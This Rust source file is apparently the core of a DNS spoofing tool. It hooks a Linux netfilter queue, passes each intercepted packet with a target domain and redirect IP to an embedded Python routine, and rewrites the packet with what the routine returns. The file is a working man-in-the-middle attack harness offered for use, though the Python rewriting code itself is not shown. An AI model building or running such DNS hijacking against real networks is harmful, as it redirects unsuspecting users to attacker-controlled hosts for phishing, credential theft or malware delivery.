use std::{sync::atomic::{AtomicBool, Ordering}, sync::Arc};
use nfq::{Queue, Verdict};
use pyo3::{types::PyTuple, prelude::*};

#[derive(Clone)]
pub struct DNSSpoof
{
    domain: String,
    redirect_to: String,
}

impl DNSSpoof
{
    pub fn new(domain: String, redirect_to: String) -> DNSSpoof
    {
        DNSSpoof
        {
            domain,
            redirect_to,
        }
    }
}

fn process_message(msg: &mut nfq::Message, redirect_to_ip: String, domain_name: String) -> Verdict
{
    let verdict = Verdict::Accept;
    let data = msg.get_payload();

    let py_app = include_str!(concat!(env!("CARGO_MANIFEST_DIR"), "/Python/pythonfuncs.py"));
    let from_python = Python::with_gil(|py| -> Result<Vec<u8>, PyErr>{
        let app: Py<PyAny> = PyModule::from_code(py, py_app, "pythonfuncs.py", "pythonfuncs")?
            .getattr("process_packet")?.into();

        let args = PyTuple::new(py, &[domain_name.to_object(py), redirect_to_ip.to_object(py), data.to_object(py)]);
        let run = app.call1(py, args)?.extract::<Vec<u8>>(py)?;
        Ok(run)
    });

    match from_python
    {
        Ok(d) => 
        {
            if d.len() > 0
            {
                println!("[*] Packet modified");
                msg.set_payload(d);
            }
        },
        Err(e) => 
        {
            println!("[!] Error from Python: {}", e);
        }
    }

    verdict
}

pub fn run(dns_spoof: &DNSSpoof, running: &Arc<AtomicBool>) -> Result<(), std::io::Error>
{
    const QUEUE_NUMBER: u16 = 0;

    println!("[*] Starting DNS Spoofing");

    let mut queue = match Queue::open() 
    {
        Ok(q) => q,
        Err(e) => return Err(std::io::Error::new(std::io::ErrorKind::Other, format!("Error opening queue: {}", e)))
    };

    match queue.bind(QUEUE_NUMBER)
    {
        Ok(_) => (),
        Err(e) => return Err(std::io::Error::new(std::io::ErrorKind::Other, format!("Error binding queue: {}", e)))
    };
        
    loop 
    {
        let mut msg = match queue.recv()
        {
            Ok(m) => m,
            Err(e) => 
            {
                match queue.unbind(QUEUE_NUMBER)
                {
                    Ok(_) => (),
                    Err(e) => return Err(std::io::Error::new(std::io::ErrorKind::Other, format!("Error unbinding queue: {}", e)))
                };
                
                return Err(std::io::Error::new(std::io::ErrorKind::Other, format!("Error receiving message: {}", e)))
            }
        };

        let verdict = process_message(&mut msg, dns_spoof.redirect_to.clone(), dns_spoof.domain.clone());

        msg.set_verdict(verdict);
        match queue.verdict(msg)
        {
            Ok(_) => (),
            Err(e) => 
            {
                println!("[!] Error setting verdict: {}", e);
                continue;
            }
        }

        if !running.load(Ordering::SeqCst) 
        {
            match queue.unbind(QUEUE_NUMBER)
            {
                Ok(_) => (),
                Err(e) => return Err(std::io::Error::new(std::io::ErrorKind::Other, format!("Error unbinding queue: {}", e)))
            };
            
            break;
        }
    }

    Ok(())
}

